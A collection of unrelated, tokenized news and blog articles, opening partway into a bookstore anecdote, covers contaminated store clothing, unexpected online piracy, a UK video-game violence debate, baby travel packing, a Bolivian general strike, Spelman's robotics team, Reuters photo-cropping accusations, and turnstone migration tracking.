He ruined a rainy day play area for all the other parents and children who happened to be visiting the bookstore .
What ’s worse is that my wife said another parent tapped her on the shoulder to bring her attention to our son , who was gleefully splashing his feet in the self made puddle .
Awesome .

Clothing purchased new off the retail rack may be contaminated with potentially disease - causing organisms from bodily secretions , according to an investigation conducted by " Good Morning America .
"
The television program hired microbiologist Philip Tierno of New York University to culture 14 articles clothing purchased from three different high - and low - end chain stores in New York City .
Several articles of clothing tested positive for bacteria indicating contamination with feces or other bodily secretions .
" On this black and tan blouse we found representation of respiratory secretions , skin flora , and some fecal flora , " Tierno said .
Another jacket contained similar secretions , especially in the armpit and " buttocks " area , he said .
One blouse even contained vaginal organisms and yeast in addition to fecal bacteria .
" Some garments were grossly contaminated with many organisms ... indicating that either many people tried it on or ... someone tried it on with heavy contamination , " he said .
According to the " Good Morning America " report , the clothing probably became contaminated in changing rooms .
Alternately , the supposedly new clothes might have actually been returned items put back on the rack without washing .
" The customer probably gets the wool pulled over their eyes , " said former retail saleswoman Tori Patrick .
" A lot of people just come home and if it has a tag attached , they think it 's brand new and they wear it .
You really never know where it 's been .
" According to Tierno , the risk of becoming sick from wearing or trying on such contaminated clothing is rare , but real .
Therefore , he recommends that consumers wash all new clothing in hot water or run it through a dryer cycle before wearing .
"
In a sense , you are touching somebody 's arm pit or groin , " he said .
" So you want to be protected that 's all .
" You may not come down with anything and , most cases you do n't , but it 's potentially possible .

Movies , TV shows , software , games , porn , and music are the usual topics of conversation when it comes to any discussion about online piracy .
After all , those types of media make up the lion 's share of content found via P2P .
Still , the online world has opened the doors to sharing all manner of ideas and intellectual property besides these obvious examples , and there are a few unexpected types of content that get ripped off pretty often , thanks to the Internet .
Sewing patterns
Most of you probably know of sewing patterns as those onion paper things with strangely architectural markings on them that your mom used to buy from the craft store .
Not only do those still exist , but they are more popular — and more expensive — than ever .
The DIY revolution ( accelerated by the struggling economy ) has reinvigorated home crafters , but the Internet has helped people , er , cut down costs by sharing these patterns with one another online .
Some patterns can be purchased in PDF form — in which case , sharing them is as simple as sticking them on a Web server or e-mailing them to a friend .
Others are purchased the old fashioned way and then scanned into the computer for sharing on craft sites .
And that 's just the people who are doing it one - on - one — there are others who scan in commercial sewing patterns and then sell burned CDs of them on eBay or on their own websites .
Boat hull designs
In the same way commercial sewing patterns are being illegally distributed online , boat hulls have long been subject to unauthorized ripoffs .
In addition to the instructions and designs being posted widely among boat enthusiasts , the designs of already - created hulls were actively copied by expert knock - off artists , even before the Internet days .
This was so prevalent that a special protection for hull designs was added to the Digital Millennium Copyright Act in 1998 .
Of course , that has n't stopped ripoffs from proliferating on and off the Internet ( they 're perhaps just a little more under - the - radar ) .
Sheet music
Audio files were one of the first types of content Internet users shared on peer - to - peer networks , but sheet music is a whole different monster .
Is sharing instructions on how to create your own music really considered stealing ?
To some people , the answer is clearly no , as sheet music for practically any instrument can be found by cruising forums for musicians and even BitTorrent .
This , of course , extends outside the realm of traditional sheet music , too .
Internet users share guitar tabs and other digitized versions of sheet music , and , although they 've sometimes been targeted by music industry lawyers , there has n't yet been enough legal action from the industry to truly scare users into quitting .
Electronic embroidery files
You 've probably seen those newfangled sewing machines that come complete with LCDs and data card readers .
Many of those are automatic embroidery machines : you can purchase embroidery files from the company that makes the machine , and instruct the computer within to sew butterflies , jack - o - lanterns , or whatever your heart desires into a piece of fabric .
Those files are often proprietary and , even if you buy a machine that lets you make your own designs , you usually have to do so with proprietary ( and expensive ) software .
It 's no surprise then that users like to send around files to their private e-mail groups or forum buddies when they buy designs .
Does it still count if it's a small percentage of the population ?
In some cases , the company behind the content being shared is another multi-billion dollar corporation while in other instances , it 's the work of an individual or small business .
Either way , the content costs something to create , and sometimes Internet users are n't even aware that what they 're sharing may be copyrighted .
Do you know of other examples of unexpected content being shared online ?

[' The Magic Resolution ' is a regular GameSetWatch column by UK - based writer Lewis Denby , examining all facets of the experience of playing video games .
Are violent video games ' corrupting ' our kids ?
We 've heard that debate before , but perhaps not as obnoxiously as this ...]
" Hearing the floor manager tell the octagenarian crowd to ' really let your feelings be known if he says something you do n't agree with ' seconds before filming was pretty disconcerting .
I hope you noted the targeted ' he ' in that sentence .
I certainly did . "
Tim Ingham admits he did n't expect anything less , though .
As you might be aware , the CVG game website editor recently appeared on UK television 's The Alan Titchmarsh Show , as part of a feature on the dangers of violent gaming to children .
Hmm .
Where have we heard this before ?
Even if you did n't see the clip , you can guess where this is going .
Titchmarsh , who made a name for himself in the clearly game - related profession of celebrity gardening , chaired a debate which asked the age - old question : are violent games corrupting the minds of our young ?
Thoughtfully , he turned to the expert first .
" I was fully aware that I was n't going to be the most adulated guest of our green - fingered host , " Tim tells me .
" It would have been foolhardy to think that the core audience were anything but retired Daily Express [ a British tabloid , with a certain reputation for conservative hyperbole ] devotees , and that 's the mindset I arrived and departed with . "
It 's a shame , though .
In a section on gaming , one might expect the editor of a leading games website to be allowed to speak for more than a few seconds at a time , before being interrupted and shouted over by a hyped - up audience and the frankly reprehensible squeals of the lady sitting to his left .
That lady was Julie Peasgood .
She 's a sexual relationships expert .
She hates video games with a passion .
Shaking her head at Tim 's very reasonable remarks that violent video games should not be played by children , and as such carry age ratings ( a fact which appeared to thoroughly confuse Alan Titchmarsh ) , Peasgood launched into a furious diatribe .
" Video games are addictive ; they promote hatred , racism , sexism ; and they reward violence , " she enunciated , to rapturous applause and cheers from the studio audience .
Peasgood 's rant was n't over yet , though .
" There is a proven link between behavioural violence and video game violence , " she claimed .
" In a recent American study , over 130,000 kids worldwide were monitored , okay ?
And regardless of age , sex or culture , the kids who had a regular diet of violent video games were found to be more aggressive , they were found to be less caring , they had low self esteem issues , and they suffered from depression . "
Peasgood failed to cite which particular study that was .
I 've yet to track it down , nor have I even heard such evidence discussed in general before .
Tim 's rebuttal - that the Government commissioned Byron Review , published last year , found no link between violent video games and behavioural violence in children - was met with laughs from Peasgood and pantomime jeers from the audience .
Heard It All Before
This is n't the first time that ITV , the channel on which The Alan Titchmarsh Show occupies a regular late - afternoon slot , has demonstrated a notable bias against the medium .
Last year , the station broadcast a documentary about video game addiction .
In the half hour programme , a single games industry representative was allowed just a few seconds of air time in which to counter various extreme claims : that games have been proven to be addictive ; that this addiction leads to depression and , in one case , suicide ; that this can somehow be linked with the terrible murder of a Counter - Strike player in 2002 .
It 's difficult to know how best to oppose their bizarre anti-games agenda , though .
Unlike the BBC , ITV is funded by advertising rather than by the public , and without an enforced remit for balance and objectivity the station is basically free to broadcast what it wants , within its internally defined set of regulations and within common decency .
Julie Peasgood 's questionable reporting of an unnamed study , and her claims that games promote sexism and racism , may have been construed as libellous had she not been so markedly vague about the whole matter .
Many have called for mass complaints , but it seems unlikely that these would do much good .
There is , effectively , nothing to validly complain about .
And there 's always a risk that a cocophany of outsiders , fresh from their marathon sessions playing bloodthirsty shooters , all shouting at ITV at once could paint the medium an even worse colour than it 's already adorned with .
I contacted ITV for comment , and was put in touch with Channel Television , the broadcast licensee responsible for The Alan Titchmarsh Show .
As yet , they have not responded to my messages .
[ UPDATE : They have now .
See below . ]
Not Defeated
Despite the ferociously unpleasant seven minutes that comprised the debate 's slot , Tim Ingham is n't too disheartened - other than to be dumbfounded by Julie Peasgood 's claims that games were in some way responsible for promoting racial hatred .
" It was beyond any anti-game rhetoric I 'd witnessed before , " Tim recalls .
" My face said it all , I suppose . "
Does he feel he missed an opportunity to confront Peasgood on this matter ?
" Off - camera , certainly . "
Still , perhaps it's for the best that he did n't .
" I was all too aware of the exigencies of - let 's be honest - right - leaning daytime TV , " he says .
" I knew my argument would have been weakened by any hint of skirmish .
I needed to remain patient and relaxed throughout - affable , even - to avoid falling from ' put upon ' into ' pariah ' .
" My objectives for the day were not rocked .
I wanted to show a human face to an industry all too often painted as malevolent and Machiavellian by a frightened middle - market press .
Despite the catcalling and boos of a mindless few , I believe I did just that .
And if I snapped a couple of mothers into removing Modern Warfare 2 from their 13 - year - olds ' bedroom while I was at it , it was completely worth the rough ride . "
Ultimately , Peasgood and co. , evidently burdened by some sort of deep - set problem with the games industry , will always find a way of voicing their misinformed and misinforming views .
They have the air time , and a willingly riled - up audience , and popular opinion on their side .
From gaming 's perspective , well , we have our champions too .
There 's
The Guardian newspaper and its accompanying Observer Magazine , who are increasingly placing video game coverage among that of the more established cultural media .
And there 's people like Tim Ingham , who are prepared to cross the border into enemy territory , and fight our corner - with words , not guns .
Surprisingly , there 's even somebody like Kelvin MacKenzie , the final member of the debate .
His stance remained generally against video game violence - somewhat rich , considering he is infamous for some disastrously poor - taste war - reporting during his time as editor of The Sun newspaper .
But , next to the horror of Peasgood 's remarks , he in fact provided a breath of fresh air .
" I 'm not a gamer , " he admitted , before noting that the average age of video game players is substantially higher than the debate 's topic suggested .
" Kelvin MacKenzie was vocally appreciative of some of the points I made during filming , " Tim tells me , " not something apparently obvious from the released footage . "
So there 's hope .
There 's hope that , one day , gaming 's acceptance in mainstream society will fall neatly alongside the other forms of art and entertainment which already enjoy general approval .
Until then , it 's a good idea to stand up for our rapidly sophisticating hobby and its ever - growing industry - but , equally , it 's a good idea to stay calm and reasonable in the process .
Besides , it seems one side of this debate can safely claim the moral high ground .
" I am categorically against violence for entertainment , " said Julie Peasgood during the debate .
" It is just wrong . "
CVG have since revealed that , back in 2000 , one Julie Peasgood starred in a violent video game .
UPDATE : Since this article was published , Channel Television have responded to my email .
In particular , I asked about their stance on ensuring debates such as this one provide a balanced view on the subject in hand .
Here 's their response :
" We , at Channel Television , ensure that the show complies with the Ofcom Broadcasting Code , and on this occasion were satisfied that although strong opinions were expressed it was a balanced debate overall .
In addition to adhering to the standards set in the Code we have a responsibility to observe freedom of expression , as laid out in Article 10 of the European Convention on Human Rights .
We cannot , therefore , censor contributor 's opinions , but can take steps to ensure that other contributors are present to challenge and debate the issues in question . "

Is a mountain of baby gear spooking you off taking your baby abroad ?
Fear not !
You can leave home without bringing the entire nursery .
After lots and lots ( and lots ) of trial and error , we ’ve got it more or less down to a science .
Here ’s a list of the things we wo n’t leave home without — and the things we leave at home .
What you ’ll need .
1. Car seat .
And wheels for your baby ’s ride .
Do you need a car seat on the plane ?
In my humble opinion , it helps a lot , but is n’t required .
Do you want one on those poorly paved , winding mountain back roads where loitering cows lurk around every corner ?
Yes , most definitely yes .
So how do you get a car seat from A to B when it ’s not in use ?
We ’ve found that the best solution by far is the gogo Kidz Travelmate .
This simple but ingenious contraption is basically a board with scooter wheels that straps onto just about any car seat , making it into a primitive stroller .
While the small wheels and the low clearance do n’t exactly make it a proper baby buggy , they do help you scoot around airports and well - paved spaces like a dream .
Plus , take your baby out and you ’ve got yourself a hand trolley for your carry - ons .
2. Baby carrier .
A fringe benefit of the Americans with Disabilities Act is that US buildings and sidewalks are usually wonderfully wheel - friendly and thus stroller accessible .
Large , modern international cities are generally equally stroller friendly , although the historic parts of ancient towns may not be .
( Do n’t believe me ?
Try carrying a stroller up the spiral staircase of a castle turret . )
But the farther afield you go , the more it makes sense to forgo wheels completely .
Enter the baby carrier .
There are basically two categories of carriers : framed carriers ( i.e. backpacks ) and soft carriers .
Both do essentially the same thing : strap your baby to your body .
But each has it ’s own benefits and drawbacks and depending on your destination , you may find both equally necessary for your trip .
Backpacks
Backpacks are the workhorses of baby carrying .
They are rugged and ready for long - haul hikes and off - road adventures .
Many now have hydration systems built in , so you can carry a couple of liters of drinking water — in addition to your baby — quite comfortably .
Many also include day packs and all sorts of other bells and whistles , making them a multi- purpose device par excellence .
The downside to backpacks is that all this convenience comes with a lot of bulk .
Your kid and your gear will easily project a foot or more off your back .
Which is fine if you ’re hiking in the great outdoors , but not so fine if you ’re turning around in a cottage crystal shop .
Soft carriers
For a more compact conveyance , frameless carriers are the way to go .
These days , there are almost as many wraps , straps , and slings as there are babies in the world .
The pros and cons of each of these devices is quite literally a movement all its own .
Our personal preference is for the versatile Ergo .
Baby carriers let you keep your baby close , which is helpful not only in the aforementioned turning - around - in - a - crystal - shop scenario ( not that I ’d ever bring a baby into a crystal shop , but I digress ) , but also for providing TLC on the go .
That ’s because in a soft carrier , your baby rests against your body , whereas in a backpack , they essentially sit in a chair behind your shoulders .
The soft carrier ’s snuggly arrangement seems to keep our girls happier for longer periods , so we can climb that castle turret and see the castle ’s museum while everybody stays quiet and content .
The cons to baby wearing is that you have to carry gear and water separately .
Some carriers ( including the Ergo ) , have after - market accessories to help with the hauling a bit , but these are n’t intended for the heavy lifting serious back country trips demand , and they do return you to those bulky take - out - half - the - store proportions .
If there are more adults than babies , one person can carry a day pack and hydration system for both parents .
Or if your wanderings wo n’t take you too far off the track , it is perfectly feasible to wear a baby and carry a diaper bag .
3. Diapers and wipes .
OK , you do n’t technically need to bring these , since both cover and clean little bums the world over .
But we prefer to for two reasons : first , the quality and variety of diapers overseas can be variable at best .
Buy diapers in a developing country and you may find that you ’re seriously kickin’ it old school .
Wipes can be similarly retro .
And not in a good way .
The second reason is that it forces you to hold room in your suitcase for souvenirs .
As the trip goes by , diapers go out , treasures go in .
It ’s a great system .
4. Familiar snacks .
Eating in other countries is one of the best parts of traveling .
But finding baby - friendly food can sometimes take more time than a fussy toddler is willing to wait , especially if you ’re arriving at odd hours or in a remote area .
So it ’s helpful to have some items on the spot .
You do n’t need to bring an entire bushel of snacks — you will find baby snacks locally — but a few boxes of favorites go a long way to buying some peace and quiet when things start to go cranky or mealtimes get delayed .
5. Bibs , sippy cups , and other vital feeding supplies .
Can your kid drink from a real glass ?
Eat off a porcelain saucer without whipping it on the floor ?
Will a metal teaspoon do in a pinch ?
If the answer is ‘ no ’ to any of these questions , bring along a set or two of the mealtime items you use at home .
6. Medicines and your pediatrician ’s phone number .
There are two levels of pharmaceuticals that we pack .
Level
One is for trips to modern cities , where the equivalent of baby Tylenol — and a pharmacist that speaks English — are likely to be found at any corner drugstore .
Level
Two is for trips to more exotic locales , when we include medicines for a variety of contingencies .
For Level
One trips , we just bring the diaper bag essentials : pain killer / fever reducer , diaper cream , and a little first aid kit for boo - boos .
For Level
Two trips , we arrange a consult visit with the girls ’ pediatrician , where we discuss the CDC ’s guidelines for that destination , assess the kids ’ vaccination needs , and come up with a list of helpful over - the - counter meds , which we buy here , since getting them in developing countries can be confusing or even risky .
Lastly , we get a prescription for antibiotics , which we wo n’t plan to use without calling the doctor for her blessing first .
Which makes keeping her phone number handy an advisable thing .
7. Sunscreen
Ever since an ill - fated snorkeling trip using locally - purchased sunscreen on our honeymoon rendered me both unable to sit and amusing to others , I ’ve fostered a deep suspicion of unfamiliar sunscreens ( hey , the label said it was waterproof ! ) .
Maybe this is unfounded , but all these years later , I still prefer to slather my skin with stuff I know and trust .
When we ’re talking about my kids and the sun , I take no chances .
Especially since their sun products also need to live up to claims of being sensitive and tear - free .
8 . Toys and activities .
Experience has taught us that it is easy to overdo this category .
Do NOT pack a suitcase consisting solely of toys and books .
Just a handful of each will do .
Keep them small and light ( e.g. paperbacks are better than board books ) and dole them out slowly .
I begin by making each child an activity bag for the plane .
Starting weeks or months before our trip , I grab small , inexpensive toys , books , and stickers from big - box dollar departments and bookshop clearance tables .
I then select a small group of favorite toys and books from home .
Then I fill a wee carry - on for each kid .
Incidentally , starting in toddlerhood , most kids simply adore the idea of having their own luggage .
Older kids can even be included in the toy packing process , which they all also seem to love .
Once underway , we have a rule that the bags are not opened until we ’re in the air .
And then only one toy at a time .
Otherwise , you ’ll blow through your bag of tricks before drink service begins .
Packed at the bottom of a grownup ’s carryon is our emergency portable DVD player .
If your child is at all captivated by TV , this may become your most beloved possession if things start to melt down at 30,000 feet .
Do n’t forget earphones — not ear buds , which are n’t sized for little kids ’ ears .
While getting through the flight without your child driving the entire plane bananas is the first task of the toys you bring , it is not their only purpose .
Once you get to where you ’re going , you ’re going to be in a hotel room with nothing more to play with than a corded telephone ( which is endlessly amusing ) .
Time to break out those toys again .
We also find that this is where tried - and - true favorite books come in handy .
These little familiar tastes of home go a long way to contenting kids about to go to bed in a strange room .
That DVD player also is n’t ready for retirement .
While watching foreign kids ’
TV is fabulously entertaining for adults and kids alike ( you have n’t seen Scooby Doo until you ’ve watched it dubbed into German ) , it is nice to have the option of re-watching that favorite Pixar film .
Plus , having an in - room TV is never a guarantee , especially the farther afield you travel .
Keep in mind that you will invariably be coming home with more toys than you left with .
Every place on the planet has enchanting objects that your child ( and you ) will covet .
Be it handmade dolls from a rustic marketplace , or charming and cheerful wooden toys from a posh toy store , you will find irresistible souvenirs to add to your entertainment arsenal along the way .
9 . At least two wardrobe changes per day .
Laundry can be an option when you ’re away from home , but I would n’t count on it .
Bring at least two outfits per day for your child , especially since you ’ll be eating all your meals out and may need a goo - free shirt before dinner .
10 . Zipper storage bags .
At home , my earth - loving , granola leanings have led me to all but ban disposable plastic products from my kitchen .
On the road , I make an exception .
Zipper storage bags in quart and gallon sizes are indispensable for carrying wet and gooey things around .
Be it a food - covered spoon , ice cream - soaked shirt , or diaper disaster , it is comforting to know that the contents are hermetically sealed before you toss them back in your day pack .
They also help to organize your gear without adding bulk .
Use one for your baby ’s eating implements .
Another for diapers .
Another for baby snacks .
Another for medications .
Toss an extra handful in just in case .
They weigh next to nothing , so go to town .
What you probably wo n’t need .
Travel crib .
Almost all hotels will let you borrow a crib , and usually for free .
Always call or email ahead to reserve your crib ( often called a cot overseas ) , not only to be sure that they have them , but also so you can open your door to find it ready and waiting — often adorably so .
The quality of cribs does vary .
The dozens we ’ve seen have ranged from the spartan metal and rough - sheeted one we dubbed “ the institution crib ” ; to the cute but worrying one in Peru that was replete with cheerful bedding … and lengths of wire in place of the many screws it had lost ; to the luxe bassinet in Austria that came with a teddy bear and bath toys .
If you ’re willing to gamble a bit on the quality ( the odds of getting a good baby bed being far better the more upscale and modern the hotel ) , then you can leave a hefty piece of gear at home .
Our fall back in the event of getting a shoddy crib ( like in Peru ) is to simply let our kids share our bed .
Which is a perfectly reasonable option for us , but may not be for others .
Travel high chair
We used to travel with a portable high chair , but have stopped bothering for three reasons :
1 . Many , many restaurants have some sort of high chair — although this is less true in rural or developing areas ,
2 . Both strap - to - the - chair and hang - from - the - table styles require furniture that is in good repair and suitably shaped .
Rickety furniture , stools , benches , round - backed chairs , cafe tables , and artsy furniture can all render a travel high chair useless or dangerous ,
3 . Even the smallest high chairs are bulky , especially considering that they need to be brought along on all excursions .
Instead , prepare to be flexible .
If practical , we ’ll bring along the car seat - cum - stroller .
Or we request a booth .
Worst case scenario , we switch off holding the baby on our laps while the other parent eats .
This option is hardly ideal , but we ’ve decided that it beats carrying a high chair around .
Multiples of everything .
The watchword for packing for kids is minimalism .
Yes , you need a lot of stuff , which is all the more reason to keep that stuff to the bare essentials .
Aside from the two - per - day clothes rule , you generally do n’t need to pack on a per diem basis .
For the following , I go with a two - per - trip guideline :
Baby blankets ( they will have blankets on the plane , and hotel towels can be substituted for blankets when you ’re in your room ) .
Above - mentioned kid ’s dining items ( you can wash these in your room between meals )
Jackets / sweaters ( varies by climate , of course )
Shoes
And that ’s about it .
Rest assured that even in the most remote of areas , there are children .
And thus there are children ’s products for purchase .
So if you forget or run out of anything , chances are excellent that you can buy it locally .
In our experience , everything one child needs fits in a large suitcase .
And if it does n’t , we winnow down the pile until it does .
Then you can line it up with the rest of your luggage and chuckle that the smallest person in the family somehow has the biggest suitcase .
But it ’s a well - packed suitcase , and with it , you ’re ready for your family ’s next adventure .

In spite of condemnation from the " socialist " government of Evo Morales , the general strike launched on May 4 against a 5 % wage cap continues .
On Tuesday May 4 , the Central Obrera Boliviana ( COB ; Bolivian Workers ’ Centre ) , the chief union federation in Bolivia , launched an indefinite general strike against Evo Morales ’ Movimiento al Socialismo ( MAS ) government .
Traditionally , the Bolivian government has increased wages on May Day .
This year , the government capped private sector wage rises at 5 per cent .
The move was met with disappointment and anger from many sections of the working class .
Bolivia is the poorest country in Latin America .
The Centre for Labour and Agrarian Development Studies ( CEDLA ) has compiled statistics taking into account changes in purchasing power .
Based on these numbers , between 2006 and 2009 the average real increase in the minimum wage was barely 1.4 per cent , and the government proposal of a nominal increase of 5 per cent in the minimum wage in 2010 means a real average annual increase of only 2.3 per cent .
But there is more to it than wages .
Guido Midma , the executive secretary of the Bolivian miners ’ union federation , explained :
“ No changes have occurred in the last four years .
The promised revival of production has not happened … new jobs have not been created in the natural gas , mining , agriculture or forestry industries .
We can not remain silent .
The wage increase is miserable , even more so when the government is siding with the business community at a time when international mineral prices are on the rise .
The government is forcing workers into exploitation and slavery . ”
Morales ’ plea that workers ’ be “ rational and responsible for the country ” was flatly ignored as demonstrations were held around the country , accompanied by a 24 - hour general strike which was then extended indefinitely .
The leaders of some unions have initiated hunger strikes in protest .
The militant manufacturing and mining workers who have led the strike set up roadblocks .
Additionally , the strike has been supported by public health workers and teachers – all of whom are pressing for wage increases between 13 per cent and 26 per cent .
Morales responded by arguing that workers would have to wait for wages to go up gradually and that “ This is the way to try to achieve equality among Bolivians .
It ca n’t be done in one fell swoop .
That ’s impossible .
The Treasury ca n’t do that . ”
Echoing neoliberal logic , Morales continued : “ While we have begun to improve , I feel as though certain compañeros want everything for their salaries .
We have to invest in Bolivia – only by investing can we create more jobs . ”
Morales ’ Vice - Prime Minister Gustavo Torrico went further , telling the workers that they would have to get used to living on “ rations of bread and coffee ” .
According to the Bolivian paper La Razon , President Morales is currently under the protection of the police and military .
As the strike approached the end of its first week , Morales accused the strikers of being infiltrated by right - wing groups and the US embassy .
Morales ’ words and actions are a clear example of the logic of reformism ; the logic of attempting to reform a capitalist state .
He is constrained by the needs of a capitalist economy , and as such , has moved against the working class .
On the other hand , the COB , founded during the revolution of 1952 , is exemplary of the radical traditions of the Bolivian working class .
Its Political
Thesis , penned in 1970 , opens by saying :
“ We workers proclaim that our historic mission in the present moment is to crush imperialism and its native servants .
We proclaim that our mission is the struggle for socialism .
We proclaim that the proletariat is the revolutionary nucleus par excellence amongst working Bolivians … ”
Since Morales was sworn in to the Presidency in 2006 , however , the COB leadership has been very close to the government .
The socialist leader of the Urban Teachers ’ Union , Vilma Plata , described COB leader Pedro Montes as a “ sort of a subaltern Evo Morales , only defending the interests of the President and not the workers . ”
This makes the current strike all the more significant .
It represents the first large - scale action of workers in opposition to the Morales government , and it represents a setback for the pro-Morales section of the COB leadership .
The government , desperate to end the strike that is now well into its second week , has signed an agreement with Pedro Montes .
Montes , for his part , was delighted to go against the wishes of his union ’s members .
His fraudulent accord has been resolutely rejected by the strikers .
A number of union leaders , including leaders of the manufacturing and mining sections and the teachers ’ union , have called for Montes to step aside .
Steps have been taken towards the convocation of a COB conference that could put a new , more pro-working class leadership in place .
As of May 13 , the COB is still in talks with the government – but the key question of wage rises has not been resolved .
The rhetoric of Morales and his government has become even shriller – they have alternately tried to deny that the strike exists and accused the strikers of sabotaging Bolivia ’s “ progress ” .
Yet the strike continues .

ATLANTA ( WOMENSENEWS )
–College junior Jazmine Miller showed off a soccer - playing robot to prospective members of the Spelman Robotics , or SpelBots , team .
" His name is Charles , he ’s very difficult .
That ’s why it ’s a he , " she laughed .
" We kind of see him as human ; we talk to him , we yell at him . "
As Charles got its bearings , it spoke to the crowd in the computer lab .
" I do n’t see the ball yet I ’m sorry .
[ Pause ]
Oh , I see the ball . "
The crowd cheered as the 4 - foot - tall robot kicked the ball .
Creations such as Charles must be programmed to find and kick the ball and prevent an opposing team of robots from scoring in the annual RoboCup World Championship soccer competition .
Since 1997 the matches have been held in Asia , Europe and the United States .
Once a competition begins , the robots are on their own .
The team ’s programming skills have to account for every soccer player scenario , from kicking and blocking to getting up after falling down .
Spelman , the historically black women ’s college here , has been sending robots to the competition since 2005 , often beating graduate students from prestigious tech universities from Germany to Japan .
They had their best finish last year in Osaka , Japan , when the team tied for first place with Fukuoka Institute of Technology in Japan in the humanoid robot category .
Along the way they ’ve attracted enough interest–whether in a local campus cafeteria or an airport in Amsterdam , the Netherlands –to make Miller accustomed to attention .
" Around campus people do recognize our faces ; they say , ‘ Oh , you ’re on the SpelBots , you ’re doing the robotics thing .
I saw you in Jet magazine . ’
I really see it when I go abroad , " said Miller , a computer science and engineering major .
Early Romance with Robotics
Miller ’s romance with robotics started early .
A self - described " world - traveling military kid , " she was on the robotics team at her high school in the Netherlands .
Jonecia Keels , from Ft. Lauderdale , Fla. , is Miller ’s co-captain .
She was a little less sure of a computer career .
" For a long time I did n’t think I was smart enough to get into computer science .
I only saw males in the industry and I just did n’t think I had what it took to be a computer programmer , " said Keels .
Two things helped change her mind .
First , the confidence she gained at this women ’s college .
" I know a big reason why there ’s not a lot of women in computer science is because of intimidation .
At an all - women ’s school , they already know your capabilities .
So it is easier to take leadership roles and go that step further without added stress , " said Keels .
Keels adds that false perceptions –of being stuck in a basement lab , all by yourself –also hurt young women ’s interest in the field .
" That ’s not what it is at all !
It ’s a very social environment , because there ’s a lot of teamwork involved , " she said .
Andrew Williams , the professor who is head of the computer science department and SpelBots ’ founder and coach , is Keels ’ second reason for gained confidence .
" After my first semester at Spelman I definitely was solid in computer science and I knew that ’s what I wanted to do , in part because of him , " she said .
Before joining the Spelman faculty in 2004 , Williams worked in the computer industry , at GE Medical Systems , in Waukesha , Wis. , and was a professor at the University of Iowa in Iowa City .
Lack of Role Models
" Looking back at my life , there were a lack of role models for me , being African American and Korean , " Williams said .
So he sought out a teaching position at a historically - black college or university .
Creating the team was a way to bring a new and creative challenge to his students .
" There ’s a big emphasis on creativity , collaboration , the social aspects of engineering and computer science .
It would do great wonders for our country on a global scale if we maximize that pool of women , and underrepresented students like African Americans , in computer science , " Williams said .
At some RoboCup competitions , both Keels and Miller sensed discrimination .
For example , at the Osaka games , " There were a lot of stares at the competition , nasty attitudes toward us , " Keels said .
However , Keels added that it was a good learning experience .
" We were n’t an easy win like I think they thought we would be , being an all female , all African - American team , being from an undergrad institution as well .
And we tied for first place ! "
" The teams we were competing with were all male , all white , " said Miller .
" And the first thought that came to me was , we are going to blow their minds ! " she laughed .
Williams , the coach , tries to find " teaching moments " in the negative situations the team occasionally faces .
" There ’s still global racism , there ’s global sexism .
And what they do in computer science and engineering here at Spelman can have a global impact .
We showed them women doing computer science .
They probably had never seen African American women doing that , " said Williams .
Miller enjoys helping to break down barriers .
" I really love traveling with SpelBots because I feel like I am literally tearing apart the stereotypes about computer scientists and roboticists , " she said .

The British - based Reuters news agency has been stung for the second time by charges that it edited politically sensitive photos in a way that casts Israel in a bad light .
But this time Reuters claims it was n’t at fault .
The news agency reacted to questions raised by an American blogger who showed that Reuters ' photo service edited out knives and blood traces from pictures taken aboard the activist ship Mavi Marmara during a clash with Israeli commandos last week .
Nine people were killed and scores were injured in the clash .
The pictures of the fight were released by IHH , the Turkish - based group that sponsored the six - ship fleet that tried to break Israel 's blockade of Gaza .
In one photo , an Israeli commando is shown lying on the deck of the ship , surrounded by activists .
The uncut photo released by IHH shows the hand of an unidentified activist holding a knife .
But in the Reuters photo , the hand is visible but the knife has been edited out .
The blog “ Little Green Footballs ” challenged Reuters ' editing of the photo .
“ That ’s a very interesting way to crop the photo .
Most people would consider that knife an important part of the context .
There was a huge controversy over whether the activists were armed .
Cropping out a knife , in a picture showing a soldier who ’s apparently been stabbed , seems like a very odd editorial decision .
Unless someone was trying to hide it , ” the blog stated .
In a second photo the unedited print issued by IHH showed blood along the ship 's railing and a hand holding a knife as an Israeli soldier lies on the deck .
Both the blood and the knife were missing in the photo that Reuters released .
Reuters on Tuesday denied it intended to alter the political meanings of the photographs .
“ The images in question were made available in Istanbul , and following normal editorial practice were prepared for dissemination which included cropping at the edges , " the news agency said in a statement .
" When we realized that a dagger was inadvertently cropped from the images , Reuters immediately moved the original set as well . "
Reuters has yet to respond to charges about the second photo .
This is the second time Reuters has been accused of manipulating photos .
In 2006 a Reuters photographer , Adnan Hajj , doctored several photos of the destruction caused by Israel 's bombing of Beirut .
In one he added smoke to a panoramic picture of South Beirut to make the damage look more severe than it was .
In a second photo , he showed a woman whose home had supposedly been destroyed in the same raid , but an investigation revealed that the woman 's house had been destroyed prior to the Israeli strike .
Reuters later removed all of Hajj 's more than 900 photos from distribution and severed its relationship with him .
A photo editor also was fired .
What happened on the Mavi Marmara and who was responsible for the killing and bloodshed on the ship is still a matter of debate .
Activists charge that Israeli commandos fired first and provoked the skirmish .
Israeli commandos say they were compelled to use deadly force after they were attacked by people on board the ship .

The Fall of Humans and the Wastland Rising blog is a blog that is intended to promote those interventions about implemting birth - control and those side effects associated having an overpopulated world and those natural catastrophies that follow on the subject .
This blog also includes valuable references such as views from the general public , spiritual leaders , politicians , and scientists ; as well as valuable photo and media gallaries and scientific statistics and facts .
At first glance , the ruddy turnstone looks barely strong enough to live up to its name let alone to migrate from one end of the world to the other .
It is little bigger than a song thrush and weighs in at somewhat less than a 250g stick of butter but the wading bird has a hard - won reputation as one of nature 's greatest migrating animals .
Now a technological breakthrough by scientists at the British Antarctic Survey has at last allowed researchers to track the routes taken by the birds and to see exactly how far and fast they fly .
Tiny light - sensitive tracking devices have shown ruddy turnstones can travel more than 16,700 miles ( 27,000 kilometres ) as they migrate from Australia to the Arctic and back again .
It took four birds fitted with the devices just over six days , with several breaks for feeding , to fly the 4,700 miles from Flinders in South East Australia to Taiwan .
One of them later managed a 3,850 mile leg in just four days and a further 3,100 mile leg in another four .
Analysis of the data provided by the tracking devices revealed that during the flight from Flinders to Taiwan and later from the Gilbert Islands to Australia the birds flew at an average speed of 31 - 34 mph ( 50 - 55 km / h ) .
" A higher speed of 65 km/h was achieved during the flight from Alaska to Kiribati , indicating possible assistance by tail winds , " added Ken Gosbell , of the Australasian Wader Studies Group ( AWSG ) which led the research .
Tracker devices have been used to monitor many species of animals but most have been far too heavy and cumbersome to load on to birds as small as the ruddy turnstone , Arenaria interpres .
With the development of miniaturised light - sensitive geotracking devices , however , a whole new vista of avian research has been opened up .
